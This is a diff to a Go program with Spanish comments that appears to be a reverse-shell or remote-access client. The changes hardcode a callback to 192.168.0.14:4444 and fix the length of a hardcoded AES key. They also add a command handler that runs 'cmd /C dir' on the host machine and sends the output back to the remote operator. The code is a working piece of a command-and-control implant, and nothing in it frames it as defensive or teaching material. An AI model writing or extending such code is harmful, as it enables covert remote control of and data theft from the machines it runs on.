@@ -9,16 +9,17 @@ import (
 	"math/big"
 	"net"
 	"os"
+	"os/exec"
 	"runtime"
-	"strconv"
+	// "strconv"
 	"time"
 )
 
-// Llave de cifrado AES (16, 24 o 32 bytes)
-var encryptionKey = []byte("supersecretkey123") // Cambia esto por una llave más segura
+// Llave de cifrado AES (16 bytes para una clave de 128 bits)
+var encryptionKey = []byte("supersecretkey12") // Cambiado a 16 bytes
 
-func generateRandomPort(min, max int64)(int64, error){
-	rangeVal := max - min +1
+func generateRandomPort(min, max int64) (int64, error) {
+	rangeVal := max - min + 1
 
 	// Generar un Puerto aleatorio en el rango [0, rangeVal]
 	n, err := rand.Int(rand.Reader, big.NewInt(rangeVal))
@@ -30,17 +31,17 @@ func generateRandomPort(min, max int64)(int64, error){
 }
 
 func main() {
-	min := int64(1024)
-	max := int64(49151)
+	// min := int64(1024)
+	// max := int64(49151)
 
-	port, err := generateRandomPort(min, max)
-	if err != nil {
-		fmt.Println("Error generando puerto aleatorio: ", err)
-		return
-	}
+	// port, err := generateRandomPort(min, max)
+	// if err != nil {
+	// 	fmt.Println("Error generando puerto aleatorio:", err)
+	// 	return
+	// }
 
 	for {
-		conn := connectToServer("192.168.0.14:" + strconv.Itoa(int(port)))
+		conn := connectToServer("192.168.0.14:4444")
 		if conn != nil {
 			defer conn.Close()
 
@@ -142,6 +143,14 @@ func listenForCommands(conn net.Conn) {
 			fmt.Println("Cerrando conexión")
 			conn.Close()
 			os.Exit(0)
+		case "dir":
+			// Ejecutar comando 'dir' en el sistema y devolverlo al cliente
+			output, err := exec.Command("cmd", "/C", "dir").Output()
+			if err != nil {
+				fmt.Println("Error ejecutando dir:", err)
+				return
+			}
+			conn.Write(output)
 		default:
 			fmt.Println("Comando desconocido:", command)
 		}
